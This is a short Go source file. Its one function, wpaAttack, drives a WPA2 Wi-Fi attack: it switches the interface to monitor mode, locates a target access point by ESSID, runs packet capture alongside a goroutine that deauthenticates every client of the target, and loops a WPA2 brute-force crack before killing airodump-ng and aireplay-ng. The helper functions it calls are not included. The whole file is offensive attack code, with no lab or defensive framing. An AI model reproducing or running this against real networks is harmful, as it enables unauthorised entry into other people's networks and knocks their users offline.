package main

import "fmt"

func wpaAttack() {
	checkAvailableInterfaces()

	setInterfaceToMonitorMode(NET_INTERFACE)

	macAddress, channel := getTargetInterfaceFromESSID(ESSID, NET_INTERFACE)

	type T = struct{}
	wait := make(chan T)

	go func() {
		analyzePackets(macAddress, channel, NET_INTERFACE)
		<-wait
	}()

	go func() {
		deauthEveryone(macAddress, channel, NET_INTERFACE)
		<-wait
	}()

	runWPA2BruteForceInLoop()
	wait <- struct{}{}

	fmt.Println("killing analyze and deauth pids...")
	execCmd("pkill -f 'airodump-ng'")
	execCmd("pkill -f 'aireplay-ng'")

	fmt.Println("quit network interface from monitor mode...")
	execCmd("airmon-ng stop wlan0")
	execCmd("service NetworkManager restart")

	fmt.Println("done")
}
